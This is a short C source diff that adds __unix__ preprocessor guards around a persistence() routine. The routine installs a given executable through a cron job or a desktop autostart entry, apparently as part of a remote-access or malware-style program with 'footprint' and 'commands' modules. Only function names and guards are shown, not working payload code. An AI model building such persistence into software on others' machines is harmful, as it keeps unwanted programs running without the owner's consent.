@@ -12,11 +12,14 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#ifdef __unix__
 #include <pwd.h>
+#endif
 
 #include "../include/footprint.h"
 #include "../include/commands.h"
 
+#ifdef __unix__
 /*
  * Creates a autostart desktop entry on systems with graphical desktop env
  *
@@ -110,13 +113,19 @@ create_cron_job(const char *executable_path) {
  * Parameters:
  *      const char *executable_path: path to the executable
  */
+#endif
+
 uint8_t
 persistence(const char *executable_path) {
+    #ifdef __unix__
     if (create_cron_job(executable_path)) {
         return 1;
     }
     if (create_desktop_autostart(executable_path)) {
         return 1;
     }
+    #else
+    (void)executable_path;
+    #endif
     return 0;
 }
